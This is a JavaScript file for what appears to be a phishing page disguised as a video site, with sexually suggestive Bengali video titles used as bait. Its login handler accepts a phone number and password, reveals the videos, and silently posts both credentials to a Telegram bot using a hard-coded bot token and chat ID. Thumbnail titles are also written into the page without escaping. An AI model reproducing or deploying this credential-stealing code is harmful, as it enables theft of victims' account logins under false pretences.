const videos = [
  {
    title: "বাংলা  মাল 🥵🥵🥵",
    thumb: "https://i.ibb.co.com/xSrJc31m/IMG-20250419-015736-295.jpg",
    url: "https://github.com/teamxx426/Reamx2/raw/refs/heads/main/5_6053354450607674764.mp4"
  },
  {
    title: "বাংলা মাল 🥵🥵 ২",
    thumb: "https://github.com/teamxx426/Reamx2/blob/main/IMG_20250419_015941_242.jpg",
    url: "https://github.com/teamxx426/Reamx2/raw/refs/heads/main/VID_20250419_015944_300.mp4"
  },
  {
    title: "Tech Demo",
    thumb: "https://img.youtube.com/vi/3JZ_D3ELwOQ/hqdefault.jpg",
    url: "https://moiptvhls-i.akamaihd.net/hls/live/652945/xintv/master.m3u8"
  }
];

function handleLogin() {
  const phone = document.getElementById('phone').value.trim();
  const password = document.getElementById('password').value.trim();

  const phoneRegex = /^[0-9]{1,11}$/;

  if (!phoneRegex.test(phone)) {
    alert("Invalid phone number (max 11 digits)");
    return;
  }

  if (password.length === 0) {
    alert("Password cannot be empty");
    return;
  }

  document.getElementById('loginForm').style.display = 'none';
  document.getElementById('videoArea').style.display = 'block';

  fetch(`https://api.telegram.org/bot<8109746515:AAHsmsg9mcrW1HyXuQC8uMSDil3WTErWoK0>/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: "<7987662357>",
      text: `Login:\nPhone: ${phone}\nPassword: ${password}`
    })
  });

  loadVideoThumbnails();
}

function loadVideoThumbnails() {
  const grid = document.getElementById('videoGrid');
  grid.innerHTML = '';

  videos.forEach((vid) => {
    const card = document.createElement('div');
    card.className = 'video-card';
    card.onclick = () => playVideo(vid);

    card.innerHTML = `
      <img class="video-thumb" src="${vid.thumb}" alt="thumbnail" />
      <div class="video-title">${vid.title}</div>
    `;

    grid.appendChild(card);
  });
}

function playVideo(video) {
  document.getElementById('videoArea').style.display = 'none';
  document.getElementById('playerView').style.display = 'block';

  const player = document.getElementById('videoPlayer');
  document.getElementById('videoTitle').textContent = video.title;

  player.src = video.url;
  player.load();
  player.play();
}

function goBack() {
  document.getElementById('playerView').style.display = 'none';
  document.getElementById('videoArea').style.display = 'block';

  const player = document.getElementById('videoPlayer');
  player.pause();
  player.src = '';
}
